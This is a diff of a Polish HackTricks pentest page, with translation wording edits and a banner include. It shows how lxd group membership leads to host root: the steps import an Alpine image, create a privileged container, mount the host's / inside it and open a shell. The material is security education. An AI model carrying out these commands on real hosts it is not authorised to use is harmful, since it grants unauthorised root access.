@@ -1,16 +1,18 @@
-# lxd/lxc Group - Eskalacja uprawnień
+# lxd/lxc Group - Privilege escalation
 
-Członkostwo w grupie zarządzającej LXD na hoście (zwykle _**lxd**_) może zapewnić drogę do uzyskania uprawnień root, umożliwiając pełną kontrolę nad daemonem.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## Exploiting bez dostępu do Internetu
+Członkostwo w grupie zarządzania LXD hosta (zwykle _**lxd**_) może zapewnić ścieżkę do root, umożliwiając pełną kontrolę nad daemonem.<sup>[[1]](#references)</sup>
 
-### Metoda 1
+## Exploiting without internet
+
+### Method 1
 
 Możesz pobrać obraz Alpine do użycia z LXD z zaufanego repozytorium.  
-Serwer obrazów LXD firmy Canonical publikuje codzienne kompilacje: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Po prostu pobierz zarówno **lxd.tar.xz**, jak i **rootfs.squashfs** z najnowszej kompilacji (nazwa katalogu to data).<sup>[[8]](#references)</sup>
+Serwer obrazów LXD firmy Canonical publikuje codzienne buildy: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+Pobierz **lxd.tar.xz** oraz **rootfs.squashfs** z najnowszego buildu (nazwa katalogu to data).<sup>[[8]](#references)</sup>
 
-Alternatywnie możesz zainstalować distrobuilder na swoim komputerze, postępując zgodnie z [instrukcjami projektu](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
+Alternatywnie możesz zainstalować distrobuilder na swojej maszynie, postępując zgodnie z [instrukcjami projektu](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -33,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Prześlij **incus.tar.xz** (**lxd.tar.xz**, jeśli pobrano z serwera obrazów Canonical) oraz **rootfs.squashfs**, a następnie zaimportuj obraz i utwórz kontener.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
+Prześlij **incus.tar.xz** (**lxd.tar.xz** jeśli obraz został pobrany z serwera obrazów Canonical) oraz **rootfs.squashfs**, następnie zaimportuj obraz i utwórz kontener.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Metoda 2
 
-Zbuduj obraz Alpine i uruchom go z flagą `security.privileged=true`, która mapuje użytkownika root z kontenera na użytkownika root hosta; zamontowanie `/` udostępnia następnie system plików hosta wewnątrz kontenera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Zbuduj obraz Alpine i uruchom go z flagą `security.privileged=true`, która mapuje root kontenera na root hosta; zamontowanie `/` udostępnia następnie system plików hosta wewnątrz kontenera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,13 +84,13 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 ```
 ## References
 
-- [1] [Jak wzmocnić bezpieczeństwo LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [1] [Jak wzmocnić zabezpieczenia LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
 - [2] [Kontenery i maszyny wirtualne LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
 - [3] [Jak kopiować i importować obrazy](https://canonical.com/lxd/docs/latest/howto/images_copy/)
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
 - [5] [Jak tworzyć obrazy za pomocą distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
 - [6] [Definicja obrazu Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-- [7] [Skrypt budujący lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [7] [Skrypt kompilacji lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
 - [8] [Serwer obrazów LXD](https://images.lxd.canonical.com/)
 - [9] [Typ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
